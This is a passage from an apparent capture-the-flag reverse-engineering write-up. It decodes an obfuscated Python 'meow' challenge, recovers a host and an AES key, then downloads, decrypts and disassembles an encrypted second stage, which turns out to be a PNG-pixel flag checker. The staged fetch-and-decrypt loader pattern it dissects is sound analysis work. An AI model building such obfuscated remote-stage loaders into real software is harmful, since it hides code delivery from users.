26 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b909bb0, file "<module>", line 10>:  
0 GEN_START                0  
  
10           2 LOAD_FAST                0 (.0)  
>>    4 FOR_ITER                19 (to 44)  
6 STORE_FAST               1 (i)  
8 LOAD_FAST                1 (i)  
10 LOAD_CONST               0 (84)  
12 BINARY_XOR  
14 LOAD_METHOD              0 (to_bytes)  
16 LOAD_CONST               1 (1)  
18 LOAD_CONST               2 ('')  
20 LOAD_METHOD              1 (join)  
22 LOAD_CONST               3 (<code object f at 0x7f8b9b909b00, file "<module>", line 10>)  
24 LOAD_CONST               4 ('meow.<locals>.<genexpr>.<genexpr>')  
26 MAKE_FUNCTION            0  
28 LOAD_CONST               5 (b'\',"')  
30 GET_ITER  
32 CALL_FUNCTION            1  
34 CALL_METHOD              1  
36 CALL_METHOD              2  
38 YIELD_VALUE  
40 POP_TOP  
42 JUMP_ABSOLUTE            2 (to 4)  
>>   44 LOAD_CONST               6 (None)  
46 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b909b00, file "<module>", line 10>:  
0 GEN_START                0  
  
10           2 LOAD_FAST                0 (.0)  
>>    4 FOR_ITER                 9 (to 24)  
6 STORE_FAST               1 (i)  
8 LOAD_GLOBAL              0 (chr)  
10 LOAD_FAST                1 (i)  
12 LOAD_CONST               0 (69)  
14 BINARY_XOR  
16 CALL_FUNCTION            1  
18 YIELD_VALUE  
20 POP_TOP  
22 JUMP_ABSOLUTE            2 (to 4)  
>>   24 LOAD_CONST               1 (None)  
26 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b909e70, file "<module>", line 19>:  
0 GEN_START                0  
  
19           2 LOAD_FAST                0 (.0)  
>>    4 FOR_ITER                19 (to 44)  
6 STORE_FAST               1 (i)  
8 LOAD_FAST                1 (i)  
10 LOAD_CONST               0 (55)  
12 BINARY_XOR  
14 LOAD_METHOD              0 (to_bytes)  
16 LOAD_CONST               1 (1)  
18 LOAD_CONST               2 ('')  
20 LOAD_METHOD              1 (join)  
22 LOAD_CONST               3 (<code object f at 0x7f8b9b909d10, file "<module>", line 19>)  
24 LOAD_CONST               4 ('meow.<locals>.<genexpr>.<genexpr>')  
26 MAKE_FUNCTION            0  
28 LOAD_CONST               5 (b'\',"')  
30 GET_ITER  
32 CALL_FUNCTION            1  
34 CALL_METHOD              1  
36 CALL_METHOD              2  
38 YIELD_VALUE  
40 POP_TOP  
42 JUMP_ABSOLUTE            2 (to 4)  
>>   44 LOAD_CONST               6 (None)  
46 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b909d10, file "<module>", line 19>:  
0 GEN_START                0  
  
19           2 LOAD_FAST                0 (.0)  
>>    4 FOR_ITER                 9 (to 24)  
6 STORE_FAST               1 (i)  
8 LOAD_GLOBAL              0 (chr)  
10 LOAD_FAST                1 (i)  
12 LOAD_CONST               0 (69)  
14 BINARY_XOR  
16 CALL_FUNCTION            1  
18 YIELD_VALUE  
20 POP_TOP  
22 JUMP_ABSOLUTE            2 (to 4)  
>>   24 LOAD_CONST               1 (None)  
26 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b90a6b0, file "<module>", line 21>:  
21           0 LOAD_CONST               0 (None)  
2 RETURN_VALUE
```

There are also strings in this disassembly which are XORed:
```python
>>> s = ''.join(chr(i ^ 42) for i in b'GOE]\x04YSF\\CO\x04LSC')  
... print(s)  
...  
meow.sylvie.fyi  
>>> s = ''.join(chr(i ^ 13) for i in b'`hbz#~ta{dh#ktd')  
... print(s)  
...  
meow.sylvie.fyi  
>>> s = ''.join(chr(i ^ 84) for i in b'\x13\x11\x00t{\' 5 =7{\'!\'$=7=;!\'\x0b59;:3\x0b!\'t\x1c\x00\x00\x04{ezeY^\x1c;\' nt91;#z\'-8"=1z2-=Y^\x17;::17 =;:nt78;\'1Y^Y^')  
... print(s)  
...  
GET /static/suspicious_among_us HTTP/1.1  
Host: meow.sylvie.fyi  
Connection: close
```
`4=\xf9\xcd\x87\xd9s;P\xae5\x02\xb9\xe8dYa\xf9\xe86L\xf8$8\x01u\x8aK\x17\xdd\xd8\xe9` is the final string not in plaintext. It seems to be an AES key:
```python
>>> key = b''.join((i ^ 55).to_bytes(1, 'big') for i in b'4=\xf9\xcd\x87\xd9s;P\xae5\x02\xb9\xe8dYa\xf9\xe86L\xf8$8\x01u\x8aK\x17\xdd\xd8\xe9')  
... print(key)  
...  
b'\x03\n\xce\xfa\xb0\xeeD\x0cg\x99\x025\x8e\xdfSnV\xce\xdf\x01{\xcf\x13\x0f6B\xbd| \xea\xef\xde'
```

I go to `meow.sylvie.fyi/static/suspicious_among_us` and download the file `suspicious_among_us`:
```shell
file suspicious_among_us  
suspicious_among_us: data

xxd suspicious_among_us | head  
00000000: d132 3c2e 4bc2 8c47 4a8f 66f5 1cee fe18  .2<.K..GJ.f.....  
00000010: d172 c7ea d908 79ef 9992 aafe 0b68 920c  .r....y......h..  
00000020: 7663 b60c a929 8cc3 1842 756d 61c8 8a93  vc...)...Buma...  
00000030: 486b f721 8a18 df33 7122 f0c9 8101 11be  Hk.!...3q"......  
00000040: 4ed5 2988 12d3 55ff 5dac 19fa dfac 8f17  N.)...U.].......  
00000050: 8068 3cf5 4133 d4c1 e093 749e cfc3 c042  .h<.A3....t....B  
00000060: 1889 71f0 84b6 50ed 252d c8c4 3a36 621c  ..q...P.%-..:6b.  
00000070: 4776 2f60 c850 8e47 6381 c91e 688f c3df  Gv/`.P.Gc...h...  
00000080: 2079 1d17 1380 5c1c 6bf4 a49c 76c0 8d6f   y....\.k...v..o  
00000090: fa3f 3c99 24f7 5ca4 28a0 5972 5413 8d05  .?<.$.\.(.YrT...
```

I run this script to decrypt the file:
```python
from Crypto.Cipher import AES

data = open("suspicious_among_us","rb").read()

enc_key = b'4=\xf9\xcd\x87\xd9s;P\xae5\x02\xb9\xe8dYa\xf9\xe86L\xf8$8\x01u\x8aK\x17\xdd\xd8\xe9'
key = bytes(b ^ 55 for b in enc_key)

ciphertext = data[:-32]
tag = data[-32:-16]
nonce = data[-16:]

cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
plaintext = cipher.decrypt_and_verify(ciphertext, tag)
open("stage2.bin","wb").write(plaintext)
print("Decrypted length:", len(plaintext))
```

Output:
```shell
python3 decrypt.py  
Decrypted length: 2277

file stage2.bin  
stage2.bin: data

strings stage2.bin  
Image  
<module>  
meow.<locals>.<genexpr>  
GOE]  
YSF\CO  
server_hostnamec  
`hbz#~ta{dh#ktd  
!meow.<locals>.<genexpr>.<genexpr>  
',"N  
to_bytes  
joinr  
cl07"7* l1*70&  
"7$*1/m3-$c  
lrmrNI  
,07yc.&,4m0:/5*&m%:*NI  
,--& 7*,-yc /,0&NINIT  
rmzph%?c  
yxbbc  
socket  
PILr  
create_default_context  
wrap_socket  
AF_INET  
SOCK_STREAMr  
connect  
sendall  
recv  
close  
index  
open  
BytesIO  
input  
print  
exit  
        enumerate  
getpixel  
show
```

I think this file is once again python 3.10 marshal bytecode. From strings I see some interesting things:
- `Image`, `PIL`: uses pillow for image processing
- `getpixel`, `show`: image pixel operations
- `input`, `print`: user interaction
- `BytesIO`: byte stream

Load `stage2.bin` with `xdis` (a cross version byte code disassembler which I use because this was hard to do in the docker container) using `python 3.10` header:
```python
python3 - << 'EOF' 
# use xdis to handle cross version marshal 
from xdis import load_module_from_file_object 
from xdis.op_imports import get_opcode_module import struct, io 
from xdis.disasm import get_disassembly

# build a fake .pyc with python 3.10 header 
data = open("stage2.bin", "rb").read() 

# python 3.10 magic = 3439 = 0x0D6F with \r\n suffix 
magic = struct.pack("<H", 3439) + b'\r\n' 
header = magic + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' 

pyc_data = header + data 

buf = io.BytesIO(pyc_data) 
(python_version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module_from_file_object(buf) 
print(f"Python version: {python_version}") 
print(f"Code type: {type(co)}") 

# Now disassemble with xdis
result = get_disassembly(co, python_version, 0) 
print(result) 
EOF
```

Output
```shell
Python version: (3, 10) Code type: <class 'xdis.codetype.code310.Code310'>
```

Checking the `xdis.disasm` API:
```shell
python3 -c "import xdis.disasm; print(dir(xdis.disasm))"
`['Bytecode', 'GRAAL3_MAGICS', 'IS_PYPY', 'PYTHON_MAGIC_INT', 'PYTHON_VERSION_TRIPLE', 'Tuple', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '__version__', '_test', 'check_object_path', 'codeType2Portable', 'code_uniquify', 'datetime', 'deque', 'dis', 'disassemble_file', 'disco', 'disco_loop', 'disco_loop_asm_format', 'format_code_info', 'format_exception_table', 'get_opcode', 'iscode', 'load_module', 'not_filtered', 'op_imports', 'os', 're', 'remap_opcodes', 'show_module_header', 'sys', 'types', 'xdis']`
```

Disassemble `stage2.bin` using `disassemble_file`:
```python
python3 - << 'EOF' 
from xdis import load_module_from_file_object 
from xdis.disasm import disassemble_file 
import struct, io, tempfile, os 

data = open("stage2.bin", "rb").read() 
magic = struct.pack("<H", 3439) + b'\r\n' 
header = magic + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' 

tmp = '/tmp/stage2.pyc' 
with open(tmp, 'wb') as f: 
	f.write(header + data) disassemble_file(tmp) 
EOF
```

Output of new disassembly:
```shell
# pydisasm version 6.1.8
# Python bytecode 3.10 (3439)
# Disassembled from Python 3.12.3 (main, Mar  3 2026, 12:15:18) [GCC 13.3.0]
# Timestamp in code: 0 (1970-01-01 00:00:00)
# Source code size mod 2**32: 0 bytes
# Method Name:       f
# Filename:          <module>
# Argument count:    0
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  15
# Stack size:        6
# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
# First Line:        3
# Constants:
#    0: None
#    1: 0
#    2: ('Image',)
#    3: ''
#    4: <Code310 code object f at 0x7ed8e408fef0, file <module>>, line 8
#    5: 'meow.<locals>.<genexpr>'
#    6: b'GOE]\x04YSF\\CO\x04LSC'
#    7: ('server_hostname',)
#    8: <Code310 code object f at 0x7ed8e3d63d10, file <module>>, line 9
#    9: b'`hbz#~ta{dh#ktd'
#   10: 443
#   11: b''
#   12: <Code310 code object f at 0x7ed8e3d840e0, file <module>>, line 10
#   13: b'\x04\x06\x17cl07"7* l1*70& \x1c "7$*1/m3-$c\x0b\x17\x17\x13lrmrNI\x0b,07yc.&,4m0:/5*&m%:*NI\x00,--& 7*,-yc /,0&NINI'
#   14: True
#   15: 4096
#   16: b'\x89PNG'
#   17: ((139, 766), (136, 759), (177, 440), (95, 810), (154, 479), (136, 758), (179, 439), (95, 808), (158, 456), (136, 758), (191, 551), (99, 796), (159, 522), (136, 758), (152, 485), (155, 458), (99, 796), (95, 809), (136, 758), (95, 808), (159, 522), (136, 758), (179, 439), (95, 808), (158, 456), (191, 551), (136, 758), (155, 458), (95, 808), (159, 512), (95, 809), (136, 758), (179, 439), (95, 808), (158, 456), (136, 758), (159, 512), (155, 458), (95, 808), (158, 456), (190, 496), (153, 479), (136, 758), (195, 443), (99, 796), (156, 456), (94, 810), (136, 758), (153, 470), (94, 810), (152, 485), (152, 485), (161, 450), (191, 551), (136, 758), (153, 479), (94, 810), (154, 463), (154, 464), (159, 512), (95, 810), (158, 521), (159, 522), (97, 786), (233, 533))
#   18: <Code310 code object f at 0x7ed8e3d84a40, file <module>>, line 21
#   19: b'rmzph%?'
#   20: <Code310 code object f at 0x7ed8e3d84b00, file <module>>, line 23
#   21: b'yxbb'
#   22: <Code310 code object f at 0x7ed8e40195e0, file <module>>, line 28
# Names:
#    0: socket
#    1: ssl
#    2: PIL
#    3: Image
#    4: io
#    5: create_default_context
#    6: wrap_socket
#    7: AF_INET
#    8: SOCK_STREAM
#    9: join
#   10: connect
#   11: sendall
#   12: recv
#   13: close
#   14: index
#   15: open
#   16: BytesIO
#   17: input
#   18: len
#   19: print
#   20: exit
#   21: enumerate
#   22: getpixel
#   23: ord
#   24: show
# Varnames:
#	socket, ssl, Image, io, _, ___, __, ____, _____, ______, __________, ___________, _______, ________, _________
# Local variables:
#    0: socket
#    1: ssl
#    2: Image
#    3: io
#    4: _
#    5: ___
#    6: __
#    7: ____
#    8: _____
#    9: ______
#   10: __________
#   11: ___________
#   12: _______
#   13: ________
#   14: _________

# Method Name:       f
# Filename:          <module>
# Argument count:    0
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  15
# Stack size:        6
# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
# First Line:        3
# Constants:
#    0: None
#    1: 0
#    2: ('Image',)
#    3: ''
#    4: <Code310 code object f at 0x7ed8e408fef0, file <module>>, line 8
#    5: 'meow.<locals>.<genexpr>'
#    6: b'GOE]\x04YSF\\CO\x04LSC'
#    7: ('server_hostname',)
#    8: <Code310 code object f at 0x7ed8e3d63d10, file <module>>, line 9
#    9: b'`hbz#~ta{dh#ktd'
#   10: 443
#   11: b''
#   12: <Code310 code object f at 0x7ed8e3d840e0, file <module>>, line 10
#   13: b'\x04\x06\x17cl07"7* l1*70& \x1c "7$*1/m3-$c\x0b\x17\x17\x13lrmrNI\x0b,07yc.&,4m0:/5*&m%:*NI\x00,--& 7*,-yc /,0&NINI'
#   14: True
#   15: 4096
#   16: b'\x89PNG'
#   17: ((139, 766), (136, 759), (177, 440), (95, 810), (154, 479), (136, 758), (179, 439), (95, 808), (158, 456), (136, 758), (191, 551), (99, 796), (159, 522), (136, 758), (152, 485), (155, 458), (99, 796), (95, 809), (136, 758), (95, 808), (159, 522), (136, 758), (179, 439), (95, 808), (158, 456), (191, 551), (136, 758), (155, 458), (95, 808), (159, 512), (95, 809), (136, 758), (179, 439), (95, 808), (158, 456), (136, 758), (159, 512), (155, 458), (95, 808), (158, 456), (190, 496), (153, 479), (136, 758), (195, 443), (99, 796), (156, 456), (94, 810), (136, 758), (153, 470), (94, 810), (152, 485), (152, 485), (161, 450), (191, 551), (136, 758), (153, 479), (94, 810), (154, 463), (154, 464), (159, 512), (95, 810), (158, 521), (159, 522), (97, 786), (233, 533))
#   18: <Code310 code object f at 0x7ed8e3d84a40, file <module>>, line 21
#   19: b'rmzph%?'
#   20: <Code310 code object f at 0x7ed8e3d84b00, file <module>>, line 23
#   21: b'yxbb'
#   22: <Code310 code object f at 0x7ed8e40195e0, file <module>>, line 28
# Names:
#    0: socket
#    1: ssl
#    2: PIL
#    3: Image
#    4: io
#    5: create_default_context
#    6: wrap_socket
#    7: AF_INET
#    8: SOCK_STREAM
#    9: join
#   10: connect
#   11: sendall
#   12: recv
#   13: close
#   14: index
#   15: open
#   16: BytesIO
#   17: input
#   18: len
#   19: print
#   20: exit
#   21: enumerate
#   22: getpixel
#   23: ord
#   24: show
# Varnames:
#	socket, ssl, Image, io, _, ___, __, ____, _____, ______, __________, ___________, _______, ________, _________
# Local variables:
#    0: socket
#    1: ssl
#    2: Image
#    3: io
#    4: _
#    5: ___
#    6: __
#    7: ____
#    8: _____
#    9: ______
#   10: __________
#   11: ___________
#   12: _______
#   13: ________
#   14: _________
  4:           0 LOAD_CONST           (0)
               2 LOAD_CONST           (None)
               4 IMPORT_NAME          (socket)
               6 STORE_FAST           (socket)

  5:           8 LOAD_CONST           (0)
              10 LOAD_CONST           (None)
              12 IMPORT_NAME          (ssl)
              14 STORE_FAST           (ssl)

  6:          16 LOAD_CONST           (0)
              18 LOAD_CONST           (('Image',))
              20 IMPORT_NAME          (PIL)
              22 IMPORT_FROM          (Image)
              24 STORE_FAST           (Image)
              26 POP_TOP

  7:          28 LOAD_CONST           (0)
              30 LOAD_CONST           (None)
              32 IMPORT_NAME          (io)
              34 STORE_FAST           (io)

  8:          36 LOAD_FAST            (ssl)
              38 LOAD_METHOD          (create_default_context)
              40 CALL_METHOD          (0 positional arguments)
              42 LOAD_ATTR            (wrap_socket)
              44 LOAD_FAST            (socket)
              46 LOAD_METHOD          (socket)
              48 LOAD_FAST            (socket)
              50 LOAD_ATTR            (AF_INET)
              52 LOAD_FAST            (socket)
              54 LOAD_ATTR            (SOCK_STREAM)
              56 CALL_METHOD          (2 positional arguments)
              58 LOAD_CONST           ("")
              60 LOAD_METHOD          (join)
              62 LOAD_CONST           (<Code310 code object f at 0x7ed8e408fef0, file <module>>, line 8)
              64 LOAD_CONST           ("meow.<locals>.<genexpr>")
              66 MAKE_FUNCTION        (No arguments)
              68 LOAD_CONST           (b'GOE]\x04YSF\\CO\x04LSC')
              70 GET_ITER
              72 CALL_FUNCTION        (1 positional argument)
              74 CALL_METHOD          (1 positional argument)
              76 LOAD_CONST           (('server_hostname',))
              78 CALL_FUNCTION_KW     (2 total positional and keyword args)
              80 STORE_FAST           (_)

  9:          82 LOAD_FAST            (_)
              84 LOAD_METHOD          (connect)
              86 LOAD_CONST           ("")
              88 LOAD_METHOD          (join)
              90 LOAD_CONST           (<Code310 code object f at 0x7ed8e3d63d10, file <module>>, line 9)
              92 LOAD_CONST           ("meow.<locals>.<genexpr>")
              94 MAKE_FUNCTION        (No arguments)
              96 LOAD_CONST           (b'`hbz#~ta{dh#ktd')
              98 GET_ITER
             100 CALL_FUNCTION        (1 positional argument)
             102 CALL_METHOD          (1 positional argument)
             104 LOAD_CONST           (443)
             106 BUILD_TUPLE          2
             108 CALL_METHOD          (1 positional argument)
             110 POP_TOP

 10:         112 LOAD_FAST            (_)
             114 LOAD_METHOD          (sendall)
             116 LOAD_CONST           (b'')
             118 LOAD_METHOD          (join)
             120 LOAD_CONST           (<Code310 code object f at 0x7ed8e3d840e0, file <module>>, line 10)
             122 LOAD_CONST           ("meow.<locals>.<genexpr>")
             124 MAKE_FUNCTION        (No arguments)
             126 LOAD_CONST           (b'\x04\x06\x17cl07"7* l1*70& \x1c "7$*1/m3-$c\x0b\x17\x17\x13lrmrNI\x0b,07yc.&,4m0:/5*&m%:*NI\x00,--& 7*,-yc /,0&NINI')
             128 GET_ITER
             130 CALL_FUNCTION        (1 positional argument)
             132 CALL_METHOD          (1 positional argument)
             134 CALL_METHOD          (1 positional argument)
             136 POP_TOP

 11:         138 LOAD_CONST           (b'')
             140 STORE_FAST           (___)

 12:         142 NOP

 13:     >>  144 LOAD_FAST            (_)
             146 LOAD_METHOD          (recv)
             148 LOAD_CONST           (4096)
             150 CALL_METHOD          (1 positional argument)
             152 STORE_FAST           (__)

 14:         154 LOAD_FAST            (__)
             156 POP_JUMP_IF_TRUE     (to 160)

 15:         158 JUMP_FORWARD         (to 170)

 16:     >>  160 LOAD_FAST            (___)
             162 LOAD_FAST            (__)
             164 INPLACE_ADD
             166 STORE_FAST           (___)

 12:         168 JUMP_ABSOLUTE        (to 144)

 17:     >>  170 LOAD_FAST            (_)
             172 LOAD_METHOD          (close)
             174 CALL_METHOD          (0 positional arguments)
             176 POP_TOP

 18:         178 LOAD_FAST            (___)
             180 LOAD_FAST            (___)
             182 LOAD_METHOD          (index)
             184 LOAD_CONST           (b'\x89PNG')
             186 CALL_METHOD          (1 positional argument)
             188 LOAD_CONST           (None)
             190 BUILD_SLICE          2
             192 BINARY_SUBSCR
             194 STORE_FAST           (___)

 19:         196 LOAD_FAST            (Image)
             198 LOAD_METHOD          (open)
             200 LOAD_FAST            (io)
             202 LOAD_METHOD          (BytesIO)
             204 LOAD_FAST            (___)
             206 CALL_METHOD          (1 positional argument)
             208 CALL_METHOD          (1 positional argument)
             210 STORE_FAST           (____)

 20:         212 BUILD_LIST           0
             214 LOAD_CONST           (((139, 766), (136, 759), (177, 440), (95, 810), (154, 479), (136, 758), (179, 439), (95, 808), (158, 456), (136, 758), (191, 551), (99, 796), (159, 522), (136, 758), (152, 485), (155, 458), (99, 796), (95, 809), (136, 758), (95, 808), (159, 522), (136, 758), (179, 439), (95, 808), (158, 456), (191, 551), (136, 758), (155, 458), (95, 808), (159, 512), (95, 809), (136, 758), (179, 439), (95, 808), (158, 456), (136, 758), (159, 512), (155, 458), (95, 808), (158, 456), (190, 496), (153, 479), (136, 758), (195, 443), (99, 796), (156, 456), (94, 810), (136, 758), (153, 470), (94, 810), (152, 485), (152, 485), (161, 450), (191, 551), (136, 758), (153, 479), (94, 810), (154, 463), (154, 464), (159, 512), (95, 810), (158, 521), (159, 522), (97, 786), (233, 533)))
             216 LIST_EXTEND          1
             218 STORE_FAST           (_____)

 21:         220 LOAD_GLOBAL          (input)
             222 LOAD_CONST           ("")
             224 LOAD_METHOD          (join)
             226 LOAD_CONST           (<Code310 code object f at 0x7ed8e3d84a40, file <module>>, line 21)
             228 LOAD_CONST           ("meow.<locals>.<genexpr>")
             230 MAKE_FUNCTION        (No arguments)
             232 LOAD_CONST           (b'rmzph%?')
             234 GET_ITER
             236 CALL_FUNCTION        (1 positional argument)
             238 CALL_METHOD          (1 positional argument)
             240 CALL_FUNCTION        (1 positional argument)
             242 STORE_FAST           (______)

 22:         244 LOAD_GLOBAL          (len)
             246 LOAD_FAST            (______)
             248 CALL_FUNCTION        (1 positional argument)
             250 LOAD_GLOBAL          (len)
             252 LOAD_FAST            (_____)
             254 CALL_FUNCTION        (1 positional argument)
             256 COMPARE_OP           (!=)
             258 POP_JUMP_IF_FALSE    (to 290)

 23:         260 LOAD_GLOBAL          (print)
             262 LOAD_CONST           ("")
             264 LOAD_METHOD          (join)
             266 LOAD_CONST           (<Code310 code object f at 0x7ed8e3d84b00, file <module>>, line 23)
             268 LOAD_CONST           ("meow.<locals>.<genexpr>")
             270 MAKE_FUNCTION        (No arguments)
             272 LOAD_CONST           (b'yxbb')
             274 GET_ITER
             276 CALL_FUNCTION        (1 positional argument)
             278 CALL_METHOD          (1 positional argument)
             280 CALL_FUNCTION        (1 positional argument)
             282 POP_TOP

 24:         284 LOAD_GLOBAL          (exit)
             286 CALL_FUNCTION        (0 positional arguments)
             288 POP_TOP

 25:     >>  290 LOAD_GLOBAL          (enumerate)
             292 LOAD_FAST            (______)
             294 CALL_FUNCTION        (1 positional argument)
             296 GET_ITER
         >>  298 FOR_ITER             (to 378)
             300 UNPACK_SEQUENCE      2
             302 STORE_FAST           (__________)
             304 STORE_FAST           (___________)

 26:         306 LOAD_FAST            (____)
             308 LOAD_METHOD          (getpixel)
             310 LOAD_FAST            (_____)
             312 LOAD_FAST            (__________)
             314 BINARY_SUBSCR
             316 CALL_METHOD          (1 positional argument)
             318 UNPACK_SEQUENCE      3
             320 STORE_FAST           (_______)
             322 STORE_FAST           (________)
             324 STORE_FAST           (_________)

 27:         326 LOAD_FAST            (_______)
             328 LOAD_FAST            (________)
             330 BINARY_XOR
             332 LOAD_FAST            (_________)
             334 BINARY_XOR
             336 LOAD_GLOBAL          (ord)
             338 LOAD_FAST            (___________)
             340 CALL_FUNCTION        (1 positional argument)
             342 COMPARE_OP           (!=)
             344 POP_JUMP_IF_FALSE    (to 376)

 28:         346 LOAD_GLOBAL          (print)
             348 LOAD_CONST           ("")
             350 LOAD_METHOD          (join)
             352 LOAD_CONST           (<Code310 code object f at 0x7ed8e40195e0, file <module>>, line 28)
             354 LOAD_CONST           ("meow.<locals>.<genexpr>")
             356 MAKE_FUNCTION        (No arguments)
             358 LOAD_CONST           (b'yxbb')
             360 GET_ITER
             362 CALL_FUNCTION        (1 positional argument)
             364 CALL_METHOD          (1 positional argument)
             366 CALL_FUNCTION        (1 positional argument)
             368 POP_TOP

 29:         370 LOAD_GLOBAL          (exit)
             372 CALL_FUNCTION        (0 positional arguments)
             374 POP_TOP
         >>  376 JUMP_ABSOLUTE        (to 298)

 30:     >>  378 LOAD_FAST            (____)
             380 LOAD_METHOD          (show)
             382 CALL_METHOD          (0 positional arguments)
             384 POP_TOP
             386 LOAD_CONST           (None)
             388 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        4
# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        8
# Constants:
#    0: 42
#    1: None
# Names:
#    0: chr
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

  8:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 24)
               6 STORE_FAST           (i)
               8 LOAD_GLOBAL          (chr)
              10 LOAD_FAST            (i)
              12 LOAD_CONST           (42)
              14 BINARY_XOR
              16 CALL_FUNCTION        (1 positional argument)
              18 YIELD_VALUE
              20 POP_TOP
              22 JUMP_ABSOLUTE        (to 4)
         >>   24 LOAD_CONST           (None)
              26 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        4
# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        9
# Constants:
#    0: 13
#    1: None
# Names:
#    0: chr
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

  9:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 24)
               6 STORE_FAST           (i)
               8 LOAD_GLOBAL          (chr)
              10 LOAD_FAST            (i)
              12 LOAD_CONST           (13)
              14 BINARY_XOR
              16 CALL_FUNCTION        (1 positional argument)
              18 YIELD_VALUE
              20 POP_TOP
              22 JUMP_ABSOLUTE        (to 4)
         >>   24 LOAD_CONST           (None)
              26 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        8
# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        10
# Constants:
#    0: 67
#    1: 1
#    2: ''
#    3: <Code310 code object f at 0x7ed8e43ffa10, file <module>>, line 10
#    4: 'meow.<locals>.<genexpr>.<genexpr>'
#    5: b'\',"'
#    6: None
# Names:
#    0: to_bytes
#    1: join
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

 10:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 44)
               6 STORE_FAST           (i)
               8 LOAD_FAST            (i)
              10 LOAD_CONST           (67)
              12 BINARY_XOR
              14 LOAD_METHOD          (to_bytes)
              16 LOAD_CONST           (1)
              18 LOAD_CONST           ("")
              20 LOAD_METHOD          (join)
              22 LOAD_CONST           (<Code310 code object f at 0x7ed8e43ffa10, file <module>>, line 10)
              24 LOAD_CONST           ("meow.<locals>.<genexpr>.<genexpr>")
              26 MAKE_FUNCTION        (No arguments)
              28 LOAD_CONST           (b'\',"')
              30 GET_ITER
              32 CALL_FUNCTION        (1 positional argument)
              34 CALL_METHOD          (1 positional argument)
              36 CALL_METHOD          (2 positional arguments)
              38 YIELD_VALUE
              40 POP_TOP
              42 JUMP_ABSOLUTE        (to 4)
         >>   44 LOAD_CONST           (None)
              46 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        4
# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        21
# Constants:
#    0: 31
#    1: None
# Names:
#    0: chr
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

 21:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 24)
               6 STORE_FAST           (i)
               8 LOAD_GLOBAL          (chr)
              10 LOAD_FAST            (i)
              12 LOAD_CONST           (31)
              14 BINARY_XOR
              16 CALL_FUNCTION        (1 positional argument)
              18 YIELD_VALUE
              20 POP_TOP
              22 JUMP_ABSOLUTE        (to 4)
         >>   24 LOAD_CONST           (None)
              26 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        4
# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        23
# Constants:
#    0: 17
#    1: None
# Names:
#    0: chr
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

 23:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 24)
               6 STORE_FAST           (i)
               8 LOAD_GLOBAL          (chr)
              10 LOAD_FAST            (i)
              12 LOAD_CONST           (17)
              14 BINARY_XOR
              16 CALL_FUNCTION        (1 positional argument)
              18 YIELD_VALUE
              20 POP_TOP
              22 JUMP_ABSOLUTE        (to 4)
         >>   24 LOAD_CONST           (None)
              26 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        4
# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        28
# Constants:
#    0: 17
#    1: None
# Names:
#    0: chr
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

 28:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 24)
               6 STORE_FAST           (i)
               8 LOAD_GLOBAL          (chr)
              10 LOAD_FAST            (i)
              12 LOAD_CONST           (17)
              14 BINARY_XOR
              16 CALL_FUNCTION        (1 positional argument)
              18 YIELD_VALUE
              20 POP_TOP
              22 JUMP_ABSOLUTE        (to 4)
         >>   24 LOAD_CONST           (None)
              26 RETURN_VALUE


# Method Name:       f
# Filename:          <module>
# Argument count:    1
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  2
# Stack size:        4
